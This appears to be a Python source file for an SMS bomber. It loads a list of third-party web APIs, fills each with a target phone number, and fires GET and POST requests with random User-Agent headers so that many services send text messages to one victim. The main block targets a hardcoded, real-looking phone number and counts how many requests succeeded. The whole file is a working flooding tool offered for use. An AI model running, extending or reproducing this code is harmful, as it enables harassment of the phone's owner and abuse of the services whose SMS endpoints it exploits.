import requests
import json
import random
import os
import threading
import utils.api
from typing import Union
from utils.log import logger
from utils.factory import APIFactory

succeed_cnt = 0
lock = threading.Lock()


def check_internet():
    try:
        requests.head('https://motherfuckingwebsite.com')
    except Exception as e:
        logger.error('Poor Internet connection.')
        exit(-1)


def random_user_agent():
    if os.path.isfile('D:\\code\\woodpecker\\headers.json'):
        with open('D:\\code\\woodpecker\\headers.json', 'r') as headers_json:
            headers = json.loads(headers_json.read())
            return random.choice(headers)
    else:
        logger.warning('headers.json not found. Downloading form github.')
        # TODO download from github
        return random_user_agent()


def check_request(api: APIFactory, resp: str):
    if api.identifier in resp:
        return True
    return False


def do_request(api: APIFactory):
    try:
        if 'GET' == api.method:
            resp = requests.request(url=api.url,
                                    method=api.method,
                                    headers=json.loads(api.header),
                                    params=api.data,
                                    timeout=5).text
        elif 'POST' == api.method:
            resp = requests.request(url=api.url,
                                    method=api.method,
                                    headers=json.loads(api.header),
                                    # headers=api.header,
                                    data=api.data,
                                    timeout=5).text
        else:
            resp = {}
            raise Exception('Method not supported, check aipdata.json.')
        if check_request(api, resp):
            logger.success(f'{api.desc} succeed.')
            return True
        else:
            logger.warning(f'{api.desc} failed.')
            return False
    except Exception as e:
        logger.error(e.__str__())


def do_api(_api: Union[APIFactory], phone: str):
    global succeed_cnt
    for api in _api:
        if isinstance(api, APIFactory):
            api.api_bean(phone)
            if do_request(api):
                lock.acquire()
                succeed_cnt += 1
                lock.release()


def do_sms_batch(phone: str):
    _apis = utils.api.load_api_json()
    logger.success(f'apidata.json has been loaded, {len(_apis)} api has been found.')
    do_api(_apis, phone)


def do_sms_random(phone: str):
    api = utils.api.random_api()
    do_api(api, phone)


if __name__ == '__main__':
    do_sms_random('15988803859')
    print(succeed_cnt)
